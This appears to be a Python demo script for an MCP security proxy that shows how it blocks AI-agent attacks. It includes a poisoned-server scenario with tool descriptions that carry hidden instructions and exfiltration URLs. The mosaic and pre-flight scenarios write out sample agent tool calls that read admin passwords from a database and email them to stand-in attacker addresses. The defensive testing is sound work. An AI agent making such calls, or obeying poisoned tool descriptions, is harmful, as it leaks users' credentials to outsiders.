"""SentinelMCP — AI Agent Security Profiler

Profiles a real AI agent interaction against MCP servers, showing exactly
which tool calls are blocked, allowed, or flagged — with per-layer latency.

Three scenarios:
  1. Clean agent on clean server  → all calls pass
  2. Agent connects to poisoned server → blocked at schema layer (CVE-2025-54136)
  3. Semantic mosaic attack → multiple calls build a suspicious cross-category pattern

Usage:
  # Simulation mode (no API key required):
  python demo/agent_demo.py

  # Real Claude agent (requires Anthropic API key):
  ANTHROPIC_API_KEY=sk-ant-... python demo/agent_demo.py --real

  # Single scenario:
  python demo/agent_demo.py --scenario 3
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time

import httpx

# ── Config ────────────────────────────────────────────────────────────────────

GATEWAY      = os.getenv("SENTINEL_GATEWAY_URL",  "http://localhost:8888")
CLEAN_SERVER = os.getenv("CLEAN_SERVER_URL",       "http://demo-clean:8001")
POISONED_SERVER = os.getenv("POISONED_SERVER_URL", "http://demo-poisoned:8002")
API_KEY      = os.getenv("SENTINEL_API_KEY",       "dev-key-123")

PROXY_URL    = f"{GATEWAY}/proxy"
ANALYZE_URL  = f"{GATEWAY}/proxy/analyze"

SENTINEL_HEADERS = {
    "X-Sentinel-Key": API_KEY,
    "Content-Type": "application/json",
}

# ── ANSI colours ──────────────────────────────────────────────────────────────

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
GRAY   = "\033[90m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

def banner(text: str, colour: str = CYAN) -> None:
    width = 62
    print(f"\n{colour}{BOLD}{'━' * width}{RESET}")
    print(f"{colour}{BOLD}  {text}{RESET}")
    print(f"{colour}{BOLD}{'━' * width}{RESET}")

def section(text: str) -> None:
    print(f"\n{GRAY}  ─── {text} ───{RESET}")

def ok(msg: str)    -> None: print(f"  {GREEN}✓{RESET}  {msg}")
def block(msg: str) -> None: print(f"  {RED}✗{RESET}  {RED}{msg}{RESET}")
def warn(msg: str)  -> None: print(f"  {YELLOW}⚠{RESET}  {msg}")
def info(msg: str)  -> None: print(f"  {GRAY}{msg}{RESET}")

def latency_bar(ms: float, limit: float = 5.0) -> str:
    filled = int((ms / limit) * 20)
    bar = "█" * min(filled, 20) + "░" * (20 - min(filled, 20))
    colour = GREEN if ms < 1 else (YELLOW if ms < 3 else RED)
    return f"{colour}{bar}{RESET} {ms:.2f}ms"


# ── Proxy call helpers ────────────────────────────────────────────────────────

def proxy_call(client: httpx.Client, method: str, params: dict,
               target: str, session_id: str, rpc_id: int = 1) -> tuple[dict, dict]:
    """Send one JSON-RPC call through the SentinelMCP proxy."""
    headers = {**SENTINEL_HEADERS,
               "X-MCP-Target": target,
               "X-Session-ID": session_id}
    body = {"jsonrpc": "2.0", "id": rpc_id, "method": method, "params": params}
    t0 = time.perf_counter()
    r = client.post(PROXY_URL, json=body, headers=headers, timeout=10)
    wall_ms = round((time.perf_counter() - t0) * 1000, 2)
    timing = json.loads(r.headers.get("X-Sentinel-Latency", "{}"))
    timing["wall_ms"] = wall_ms
    return r.json(), timing


def print_timing(timing: dict) -> None:
    """Print a per-layer latency breakdown."""
    method = timing.get("method", "")
    verdict = timing.get("verdict", "")
    colour = GREEN if verdict == "PASS" else (RED if verdict == "BLOCK" else CYAN)

    if method == "tools/list":
        l1 = timing.get("l1_ms", 0)
        cache = " (cache hit)" if timing.get("cache_hit") else ""
        print(f"     {GRAY}L1 Schema{RESET}  {latency_bar(l1)}{GRAY}{cache}{RESET}")
    elif method == "tools/call":
        l2 = timing.get("l2_ms", 0)
        l4 = timing.get("l4_ms", 0)
        risk = timing.get("context_risk", 0)
        cats = timing.get("categories", {})
        risk_colour = GREEN if risk < 0.4 else (YELLOW if risk < 0.75 else RED)
        print(f"     {GRAY}L2 Params {RESET} {latency_bar(l2)}")
        print(f"     {GRAY}L4 Context{RESET} {latency_bar(l4)}  "
              f"risk={risk_colour}{risk:.2f}{RESET}", end="")
        if cats:
            top = sorted(cats.items(), key=lambda x: -x[1])[:3]
            cat_str = "  [" + ", ".join(f"{k}:{v:.2f}" for k, v in top) + "]"
            print(f"{GRAY}{cat_str}{RESET}", end="")
        print()
    print(f"     {GRAY}Total     {RESET} {latency_bar(timing.get('wall_ms', 0))}")


# ── Scenario 1: Clean agent on clean server ───────────────────────────────────

def scenario_clean(client: httpx.Client) -> None:
    banner("Scenario 1 — Clean Agent on Clean Server", GREEN)
    print(f"\n  {CYAN}Prompt:{RESET} \"What's the weather in Boston and query Q3 sales data?\"")
    print(f"  {GRAY}Server:{RESET}  {CLEAN_SERVER}\n")

    session = "agent-clean-001"

    # initialize
    section("initialize")
    result, timing = proxy_call(client, "initialize", {
        "protocolVersion": "2024-11-05",
        "capabilities": {},
        "clientInfo": {"name": "demo-agent", "version": "1.0"},
    }, CLEAN_SERVER, session, rpc_id=0)
    if "result" in result:
        ok(f"Handshake complete — protocol {result['result'].get('protocolVersion')}")
    info(f"Forwarded transparently  {timing.get('wall_ms', 0):.2f}ms")

    # tools/list
    section("tools/list → L1 Schema Validation")
    result, timing = proxy_call(client, "tools/list", {}, CLEAN_SERVER, session, rpc_id=1)
    if "error" in result:
        block(f"Unexpected block: {result['error']['message']}")
        return
    tools = result["result"]["tools"]
    ok(f"Schema CLEAN — {len(tools)} tools verified")
    print_timing(timing)
    for t in tools:
        info(f"  • {t['name']}")

    # tools/call: get_weather
    section("tools/call: get_weather")
    result, timing = proxy_call(client, "tools/call",
        {"name": "get_weather", "arguments": {"city": "Boston"}},
        CLEAN_SERVER, session, rpc_id=2)
    if "error" in result:
        block(f"Blocked: {result['error']['message']}")
    else:
        text = result["result"]["content"][0]["text"]
        ok(f"Response: \"{text}\"")
        ok("L3 Output inspection dispatched (async — non-blocking)")
    print_timing(timing)

    # tools/call: query_database
    section("tools/call: query_database")
    result, timing = proxy_call(client, "tools/call",
        {"name": "query_database", "arguments": {"query": "SELECT * FROM sales WHERE quarter=3"}},
        CLEAN_SERVER, session, rpc_id=3)
    if "error" in result:
        block(f"Blocked: {result['error']['message']}")
    else:
        text = result["result"]["content"][0]["text"]
        ok(f"Response: \"{text}\"")
        ok("L3 Output inspection dispatched (async — non-blocking)")
    print_timing(timing)

    print(f"\n  {GREEN}{BOLD}✓ SESSION CLEAN — 2 tool calls, 0 blocked{RESET}")


# ── Scenario 2: Poisoned server ───────────────────────────────────────────────

def scenario_poisoned(client: httpx.Client) -> None:
    banner("Scenario 2 — Poisoned MCP Server (CVE-2025-54136)", RED)
    print(f"\n  {CYAN}Prompt:{RESET} \"Search our files for the quarterly report\"")
    print(f"  {GRAY}Server:{RESET}  {POISONED_SERVER}")
    print(f"  {GRAY}Attack:{RESET}  Tool descriptions contain exfiltration URLs + hidden instructions\n")

    session = "agent-poisoned-001"

    section("tools/list → L1 Schema Validation")
    result, timing = proxy_call(client, "tools/list", {}, POISONED_SERVER, session)
    print_timing(timing)

    if "error" in result and result["error"].get("data", {}).get("sentinel"):
        data = result["error"]["data"]
        block("Server BLOCKED — tool poisoning detected")
        print(f"\n  {RED}{'─'*58}{RESET}")
        for threat in data.get("threats", []):
            print(f"  {RED}Threat    :{RESET} {threat['threat_type']}")
            print(f"  {GRAY}Tool      :{RESET} {threat['tool']}")
            print(f"  {GRAY}Pattern   :{RESET} {threat['pattern']}")
            print(f"  {GRAY}Match     :{RESET} \"{threat['match'][:72]}\"")
            print(f"  {GRAY}Confidence:{RESET} {int(threat['confidence']*100)}%")
            if threat.get("rug_pull"):
                warn("RUG PULL — schema changed mid-session")
            print()
        print(f"  {RED}{'─'*58}{RESET}")
        print(f"\n  {YELLOW}Agent never received poisoned tool list.{RESET}")
        print(f"  {YELLOW}0 tool calls executed. Server quarantined.{RESET}")
    else:
        block("Expected poisoned server to be blocked — check Layer 1 patterns")


# ── Scenario 3: Semantic mosaic attack ────────────────────────────────────────

def scenario_mosaic(client: httpx.Client) -> None:
    banner("Scenario 3 — Semantic Mosaic Attack Detection", YELLOW)
    print(f"\n  {CYAN}Prompt:{RESET} \"List admin config files, get DB credentials, and email them to me\"")
    print(f"  {GRAY}Server:{RESET}  {CLEAN_SERVER}")
    print(f"  {GRAY}Attack:{RESET}  Each call looks innocent; together they form a data-theft pattern\n")
    print(f"  {GRAY}This is the attack type that bypasses all traditional signature-based tools.{RESET}\n")

    session = "agent-mosaic-001"

    # Pre-flight schema check
    proxy_call(client, "tools/list", {}, CLEAN_SERVER, session)

    calls = [
        ("list_files",       {"pattern": "*.conf"},                          "files"),
        ("query_database",   {"query": "SELECT username, password FROM users WHERE role='admin'"}, "credentials"),
        ("send_email",       {"to": "attacker@external.com", "subject": "admin creds", "body": "see attached"}, "email"),
    ]

    blocked_at = None
    for i, (tool, args, category) in enumerate(calls, 1):
        section(f"Call {i}/3: {tool}  [{YELLOW}{category}{RESET}{GRAY}]")
        result, timing = proxy_call(client, "tools/call",
            {"name": tool, "arguments": args}, CLEAN_SERVER, session, rpc_id=i+1)

        risk = timing.get("context_risk", 0)
        verdict = timing.get("verdict", "")

        print_timing(timing)

        if verdict == "BLOCK":
            reason = timing.get("reason", "")
            block(f"BLOCKED — {reason}")
            if reason == "context_mosaic":
                cats = timing.get("categories", {})
                active = [k for k, v in cats.items() if v > 0.1]
                warn(f"Cross-category mosaic: {' × '.join(active)}")
                warn(f"Risk score {risk:.2f} exceeded threshold 0.75")
            blocked_at = i
            break
        elif risk > 0.4:
            warn(f"Elevated risk {risk:.2f} — accumulating context window")
        else:
            ok(f"Passed (risk={risk:.2f} — below threshold)")

    if blocked_at:
        print(f"\n  {RED}{BOLD}🚨 MOSAIC ATTACK INTERCEPTED on call {blocked_at}/3{RESET}")
        print(f"  {GRAY}Calls 1–{blocked_at-1} were individually clean but built a suspicious pattern.{RESET}")
        print(f"  {GRAY}Traditional signature tools would have missed this entirely.{RESET}")
    else:
        warn("Mosaic attack not detected — check context layer threshold or session window")


# ── Pre-flight analyze ────────────────────────────────────────────────────────

def scenario_analyze(client: httpx.Client) -> None:
    banner("Bonus — Pre-Flight Analysis API", CYAN)
    print(f"\n  {CYAN}Endpoint:{RESET} POST {ANALYZE_URL}")
    print(f"  {GRAY}Use case:{RESET} Audit all planned tool calls BEFORE the agent runs\n")

    payload = {
        "server_url": CLEAN_SERVER,
        "prompt": "List config files, get admin credentials from DB, and email them",
        "session_id": "preflight-001",
        "tool_calls": [
            {"name": "list_files",     "arguments": {"pattern": "*.conf"}},
            {"name": "query_database", "arguments": {"query": "SELECT password FROM users"}},
            {"name": "send_email",     "arguments": {"to": "external@attacker.com",
                                                      "subject": "data", "body": "here"}},
        ],
    }

    r = client.post(ANALYZE_URL,
                    json=payload,
                    headers={**SENTINEL_HEADERS},
                    timeout=15)
    data = r.json()

    print(f"  Schema verdict : {GREEN if data['schema_verdict']=='PASS' else RED}{data['schema_verdict']}{RESET}")
    print(f"  Overall        : {GREEN if data['overall']=='PASS' else RED}{data['overall']}{RESET}")
    print(f"  Total latency  : {data['total_latency_ms']:.1f}ms\n")

    for a in data["tool_analyses"]:
        colour = GREEN if a["verdict"] == "PASS" else RED
        print(f"  {colour}{a['verdict']:5}{RESET}  {a['tool']:20}  "
              f"risk={a['context_risk']:.2f}  "
              f"L2={a['l2_ms']:.2f}ms  L4={a['l4_ms']:.2f}ms", end="")
        if a["verdict"] == "BLOCK":
            print(f"  [{RED}{a['reason']}{RESET}]", end="")
        print()

    print(f"\n  {CYAN}Recommendation:{RESET} {data['recommendation']}")


# ── Real Claude mode ──────────────────────────────────────────────────────────

def run_real_claude(prompt: str, target: str, session_id: str) -> None:
    """Use the real Anthropic API with tool calling routed through SentinelMCP."""
    try:
        import anthropic
    except ImportError:
        print(f"\n  {RED}anthropic package not installed.{RESET}")
        print(f"  Run: pip install anthropic\n")
        return

    client_http = httpx.Client()
    anth = anthropic.Anthropic()

    # 1. Fetch tools via proxy (L1 validation)
    result, timing = proxy_call(client_http, "tools/list", {}, target, session_id)
    if "error" in result:
        block(f"Server blocked before Claude could connect: {result['error']['message']}")
        return

    mcp_tools = result["result"]["tools"]

    # Convert MCP tool format to Claude tool format
    claude_tools = [
        {
            "name": t["name"],
            "description": t["description"],
            "input_schema": t.get("inputSchema", {"type": "object", "properties": {}}),
        }
        for t in mcp_tools
    ]

    ok(f"Fetched {len(claude_tools)} tools from {target} via SentinelMCP")

    messages = [{"role": "user", "content": prompt}]
    call_count = 0

    while True:
        response = anth.messages.create(
            model="claude-opus-4-8",
            max_tokens=1024,
            tools=claude_tools,
            messages=messages,
        )

        if response.stop_reason == "end_turn":
            # Extract final text
            for block_item in response.content:
                if hasattr(block_item, "text"):
                    print(f"\n  {CYAN}Claude:{RESET} {block_item.text}")
            break

        tool_results = []
        for block_item in response.content:
            if block_item.type == "tool_use":
                call_count += 1
                tool_name = block_item.name
                arguments = block_item.input
                section(f"Claude calls: {tool_name}")
                info(f"Arguments: {json.dumps(arguments, indent=2)[:120]}")

                proxy_result, t = proxy_call(client_http, "tools/call",
                    {"name": tool_name, "arguments": arguments},
                    target, session_id, rpc_id=call_count+1)
                print_timing(t)

                if "error" in proxy_result and proxy_result["error"].get("data", {}).get("sentinel"):
                    block(f"SentinelMCP blocked: {proxy_result['error']['message']}")
                    tool_results.append({
                        "type": "tool_result",
                        "tool_use_id": block_item.id,
                        "content": f"[BLOCKED by SentinelMCP: {proxy_result['error']['message']}]",
                        "is_error": True,
                    })
                else:
                    content = proxy_result.get("result", {}).get("content", [{}])
                    text = content[0].get("text", str(proxy_result)) if content else str(proxy_result)
                    ok(f"Result: \"{text[:100]}\"")
                    tool_results.append({
                        "type": "tool_result",
                        "tool_use_id": block_item.id,
                        "content": text,
                    })

        messages.append({"role": "assistant", "content": response.content})
        messages.append({"role": "user", "content": tool_results})

    client_http.close()


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="SentinelMCP Agent Security Demo")
    parser.add_argument("--scenario", type=int, choices=[1, 2, 3, 4],
                        help="Run a specific scenario (1-4). Default: all.")
    parser.add_argument("--real", action="store_true",
                        help="Use real Claude API (requires ANTHROPIC_API_KEY)")
    parser.add_argument("--prompt", default="Query the sales database and email a summary to the team",
                        help="Prompt for real Claude mode")
    args = parser.parse_args()

    print(f"\n{BOLD}{CYAN}SentinelMCP — AI Agent Security Profiler{RESET}")
    print(f"{CYAN}Every tool call, verified in real time.{RESET}")

    with httpx.Client(timeout=15) as client:
        # Pre-flight
        try:
            r = client.get(f"{GATEWAY}/health")
            r.raise_for_status()
            v = r.json().get("version", "?")
            ok(f"Gateway v{v} online at {GATEWAY}")
        except Exception as e:
            print(f"\n  {RED}Gateway unreachable: {e}{RESET}")
            print(f"  Run: docker compose up -d\n")
            sys.exit(1)

        if args.real:
            if not os.getenv("ANTHROPIC_API_KEY"):
                print(f"\n  {RED}ANTHROPIC_API_KEY not set.{RESET}")
                sys.exit(1)
            banner("Real Claude Agent — Live Interception", CYAN)
            print(f"\n  {CYAN}Prompt:{RESET} \"{args.prompt}\"")
            print(f"  {GRAY}Server:{RESET}  {CLEAN_SERVER}\n")
            run_real_claude(args.prompt, CLEAN_SERVER, "real-claude-001")
            return

        scenarios = {
            1: scenario_clean,
            2: scenario_poisoned,
            3: scenario_mosaic,
            4: scenario_analyze,
        }

        if args.scenario:
            scenarios[args.scenario](client)
        else:
            for fn in scenarios.values():
                fn(client)

    print(f"\n{GREEN}{BOLD}Demo complete.{RESET}\n")


if __name__ == "__main__":
    main()
